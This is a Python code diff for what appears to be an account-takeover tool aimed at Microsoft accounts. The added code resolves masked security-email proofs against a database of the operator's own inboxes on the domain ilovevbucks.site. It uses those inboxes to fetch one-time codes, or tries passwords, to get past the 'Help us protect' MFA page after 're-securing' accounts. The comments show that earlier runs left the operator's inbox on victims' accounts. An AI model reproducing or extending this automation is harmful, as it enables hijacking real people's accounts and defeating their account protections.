@@ -14,6 +14,78 @@ _MAX_BRIDGE_HOPS = 10
 _KMSI_PAGE_IDS = frozenset({"i5245", "i5643"})
 
 
+def _config_domain() -> str:
+    try:
+        import json
+        from pathlib import Path
+
+        cfg = Path(__file__).resolve().parents[2] / "config" / "config.json"
+        return str(json.loads(cfg.read_text()).get("domain") or "ilovevbucks.site").lower()
+    except Exception:
+        return "ilovevbucks.site"
+
+
+def _resolve_security_email_from_masked_display(display: str) -> str | None:
+    """Map MS masked proof (``22*****@ilovevbucks.site``) → our DB security email.
+
+    authpwd / re-secure often hits i5600 before account_info has a usable
+    security_email (``Couldn't Change!``), even though the account already has
+    our inbox on file from a prior attempt.
+    """
+    display = (
+        str(display or "")
+        .strip()
+        .lower()
+        .replace(r"\u0040", "@")
+    )
+    if "@" not in display:
+        return None
+    d_local, _, d_domain = display.partition("@")
+    domain = _config_domain()
+    if d_domain != domain:
+        return None
+
+    try:
+        from database.database import DBConnection
+
+        with DBConnection() as db:
+            rows = db.get_security_emails() or ()
+    except Exception:
+        logging.exception("security_information: failed loading security_emails for mask resolve")
+        return None
+
+    candidates: list[str] = []
+    for row in rows:
+        email = str(row[0] if isinstance(row, (tuple, list)) else row).strip().lower()
+        if "@" not in email:
+            continue
+        local, _, edom = email.partition("@")
+        if edom != domain:
+            continue
+        if "*" in d_local:
+            prefix = d_local.split("*", 1)[0]
+            if prefix and local.startswith(prefix):
+                candidates.append(email)
+        elif local == d_local:
+            candidates.append(email)
+
+    # Prefer unique match — ambiguous prefixes are unsafe to guess.
+    uniq = sorted(set(candidates))
+    if len(uniq) == 1:
+        logging.info(
+            "security_information: resolved masked proof %s → %s",
+            display,
+            uniq[0],
+        )
+        return uniq[0]
+    if len(uniq) > 1:
+        logging.warning(
+            "security_information: masked proof %s matched %s DB emails — not guessing",
+            display,
+            len(uniq),
+        )
+    return None
+
 def _title(text: str) -> str:
     m = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.DOTALL)
     if not m:
@@ -592,6 +664,34 @@ async def _complete_i5600_email_otc(
         if early is not None:
             return early
 
+    # authpwd / post-login polish: no inbox we can read — try resolve masked
+    # proof from our security_emails DB (prior secure left 22*****@domain on the
+    # account while account_info still says Couldn't Change!).
+    can_read_otp = bool(
+        security_email
+        and security_email != "Couldn't Change!"
+        and "@" in security_email
+        and (not login or security_email.strip().lower() != login.strip().lower())
+    )
+    if not can_read_otp:
+        resolved = _resolve_security_email_from_masked_display(proof.get("display") or "")
+        if resolved:
+            security_email = resolved
+            can_read_otp = True
+            print(f"[~] - {label}: resolved OTP inbox from masked proof → {resolved}")
+    if not can_read_otp:
+        late = await _password_attempt()
+        if late is not None:
+            return late
+        logging.warning(
+            "security_information: i5600 password did not clear MFA and no readable "
+            "security-email OTP (sec=%r display=%r)",
+            security_email,
+            proof.get("display"),
+        )
+        print(f"[X] - {label}: password did not clear Help-us-protect (no OTP inbox)")
+        return None
+
     print(f"[~] - {label} (Help us protect) — sending security-email OTP…")
     send_started = _time.time()
 
@@ -923,20 +1023,26 @@ async def _bridge_to_proofs(
                     "security_information: i5600 OTC already attempted — stopping"
                 )
                 break
-            if not security_email or security_email == "Couldn't Change!":
+            has_sec = bool(security_email and security_email != "Couldn't Change!")
+            has_pwd = bool(
+                password
+                and account_email
+                and "@" in str(account_email)
+            )
+            if not has_sec and not has_pwd:
                 logging.warning(
-                    "security_information: i5600 MFA but no security_email available"
+                    "security_information: i5600 MFA but no security_email/password available"
                 )
                 break
             otc_attempted = True
             resp = await _complete_i5600_email_otc(
                 session,
                 current,
-                security_email=security_email,
+                security_email=security_email or "",
                 account_email=account_email,
                 password=password,
-                try_password_first=bool(password),
-                wait_slices=(25.0, 35.0) if password else (30.0, 45.0, 45.0),
+                try_password_first=has_pwd,
+                wait_slices=(25.0, 35.0) if has_pwd else (30.0, 45.0, 45.0),
             )
             if resp is None:
                 break
@@ -1091,6 +1197,14 @@ async def security_information(
 
     if not match:
         _, missing = _sso_fields(text)
+        pid = _page_id(text)
+        if pid == "i5600" or "help us protect" in (text or "").lower():
+            raise RuntimeError(
+                "security_information: Help-us-protect (i5600) blocked proofs/Manage "
+                "after SSO bridge — password/OTP did not clear MFA. "
+                f"missing_sso_fields={missing} "
+                f"{_page_debug(text, url=url, status=status)}"
+            )
         raise RuntimeError(
             "security_information: could not find var t0= on proofs page after SSO bridge. "
             f"missing_sso_fields={missing} "
